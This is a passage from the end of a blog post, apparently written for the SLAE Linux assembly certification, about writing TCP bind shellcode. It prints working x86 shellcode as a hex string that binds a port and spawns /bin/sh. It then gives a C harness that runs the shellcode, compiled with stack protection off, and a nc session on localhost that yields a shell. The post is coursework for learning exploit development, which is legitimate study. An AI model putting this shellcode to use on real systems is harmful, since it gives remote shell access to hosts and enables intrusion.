    <span class="k">print</span><span class="p">(</span><span class="s">'##################################'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Warning: Null byte in shellcode!'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'##################################'</span><span class="p">)</span>
</code></pre></div></div>

<p>Here’s the script in action:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment1$ ./prepare.py 5555
Here's the shellcode using port 5555:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
</code></pre></div></div>

<p>The shellcode is then added to the test program.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span><span class="s">"</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %d bytes.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span> 
        <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~$ gcc -o test -fno-stack-protector -z execstack shellcode.c 
slemire@slae:~$ ./test
[...]
slemire@slae:~$ nc -nv 127.0.0.1 5555
Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
whoami
slemire
</code></pre></div></div>

<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>

<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<p>Student ID: SLAE-1236</p>

<p>All source files can be found on GitHub at <a href="https://github.com/slemire/slae32">https://github.com/slemire/slae32</a></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#slae" class="page__taxonomy-item" rel="tag">slae</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tcp-bind-shellcode" class="page__taxonomy-item" rel="tag">tcp bind shellcode</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#slae" class="page__taxonomy-item" rel="tag">slae</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-11-18T00:00:00+01:00">November 18, 2018</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="#" class="pagination--pager disabled">Previous</a>
    
    
      <a href="/tcp-reverse_shellcode/" class="pagination--pager" title="TCP reverse shellcode
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
